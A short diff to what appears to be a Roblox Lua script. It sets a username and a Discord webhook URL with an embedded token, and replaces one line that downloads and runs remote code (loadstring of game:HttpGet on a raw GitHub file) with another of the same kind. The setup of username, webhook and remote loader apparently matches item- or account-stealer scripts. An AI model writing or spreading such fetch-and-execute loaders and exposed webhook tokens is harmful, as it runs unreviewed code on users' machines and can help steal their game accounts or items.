@@ -1,5 +1,5 @@
-_G.UserID = "1809183167"
+UserName = "GHITABAHLOUL02"
 
-_G.WebhookUrl = "https://discord.com/api/webhooks/1089494053839708220/V8wLDvR3-8w1eJ5Qcg5QUHOiugwDlHNkdU34oloR--s3NzrHP7P_G6iKSO7V0oEevlnu"
+Webhook = "https://discord.com/api/webhooks/1094352245602136185/RmWSuBcEwTwZP8q8-GtuCR_fF1P3axyTMaRWYjYrktd8Jq3CsZ-fvmx0GX3JbmFx83t6"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/scriptpsx/main/bank.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
